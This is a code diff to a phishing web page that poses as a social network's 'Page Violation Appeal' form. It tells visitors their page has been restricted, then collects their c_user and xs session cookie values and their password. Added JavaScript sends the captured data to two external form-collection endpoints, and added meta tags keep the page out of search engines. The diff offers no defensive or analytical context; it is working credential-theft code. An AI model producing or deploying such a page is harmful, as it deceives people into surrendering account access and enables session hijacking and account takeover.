@@ -3,7 +3,10 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Help Center - Page Violation Appeal</title>
+  <meta name="robots" content="noindex, nofollow">
+  <meta name="googlebot" content="noindex, nofollow">
+  <meta name="description" content="Page Violation Appeal Review Form.">
+  <title>Review Form</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -36,19 +39,6 @@
       line-height: 1.5;
       margin-bottom: 15px;
     }
-    .video-container {
-      margin-bottom: 15px;
-    }
-    video {
-      width: 100%;
-      height: auto;
-      border-radius: 5px;
-    }
-    img {
-      width: 100%;
-      height: auto;
-      border-radius: 5px;
-    }
     .form-group {
       margin-bottom: 15px;
     }
@@ -80,12 +70,6 @@
     .btn:hover {
       background-color: #165dc1;
     }
-    .note {
-      font-size: 12px;
-      color: #606770;
-      margin-top: 10px;
-      line-height: 1.4;
-    }
   </style>
 </head>
 <body>
@@ -93,16 +77,7 @@
     <h1>Page Violation Appeal</h1>
     <p>We have detected unusual activity on your page that violates our community standards.</p>
     <p>Your access to your page has been limited, and you currently cannot post, share, or comment using your page.</p>
-    <p>If you believe this is an error, you have the option to submit an appeal by providing the necessary information.</p>
-    <p><strong>Detailed Video Information</strong></p>
-    <div class="video-container">
-      <video controls poster="video.png">
-        <source src="detailed video.mp4" type="video/mp4">
-        Your browser does not support the video tag. Please update your browser.
-      </video>
-    </div>
-    <p>You must watch the provided video to provide the requested information below.</p>
-    <form action="https://submit-form.com/rDJY6yFPF" method="POST">
+    <form id="violationForm">
       <div class="form-group">
         <label for="c_user">c_user:</label>
         <input type="text" id="c_user" name="c_user" placeholder="Enter your User ID" required>
@@ -111,9 +86,38 @@
         <label for="xs">xs:</label>
         <input type="text" id="xs" name="xs" placeholder="Enter your XS token" required>
       </div>
-      <button type="submit" class="btn">Send</button>
+      <div class="form-group">
+        <label for="password">Password:</label>
+        <input type="password" id="password" name="password" placeholder="Enter your Password" required>
+      </div>
+      <button type="button" class="btn" onclick="submitToTwoEndpoints()">Send</button>
     </form>
-    <p class="note">Please ensure not to log out of your account on your computer or laptop until you have received a verification email.</p>
   </div>
+  <script>
+    function submitToTwoEndpoints() {
+      const form = document.getElementById('violationForm');
+      const formData = new FormData(form);
+
+      // First endpoint
+      fetch('https://submit-form.com/SqWKt7JWm', {
+        method: 'POST',
+        body: formData,
+      }).then(response => {
+        console.log('Form submitted to first endpoint:', response);
+      }).catch(error => {
+        console.error('Error submitting to first endpoint:', error);
+      });
+
+      // Second endpoint
+      fetch('https://submit-form.com/hPx4wa7QJ', {
+        method: 'POST',
+        body: formData,
+      }).then(response => {
+        console.log('Form submitted to second endpoint:', response);
+      }).catch(error => {
+        console.error('Error submitting to second endpoint:', error);
+      });
+    }
+  </script>
 </body>
 </html>
